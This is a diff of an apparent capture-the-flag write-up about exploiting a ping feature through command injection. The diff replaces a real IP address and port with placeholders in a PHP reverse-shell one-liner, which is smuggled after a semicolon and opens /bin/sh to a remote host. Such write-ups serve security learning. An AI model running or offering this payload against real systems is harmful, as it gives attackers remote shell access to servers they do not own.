@@ -117,7 +117,7 @@ lets us ping an ip address. I bet this can also do other things with some clever
 
 tried python, bash shells... didn't work. I think the machine does not let bash make connections like this here, and python command is too long (limited to 200 chars as seen in view source)
 
-;php -r '$sock=fsockopen("108.177.134.107",32928);exec("/bin/sh -i <&3 >&3 2>&3");'
+;php -r '$sock=fsockopen("PUBLIC_IP",PORT);exec("/bin/sh -i <&3 >&3 2>&3");'
 
 works!!
 
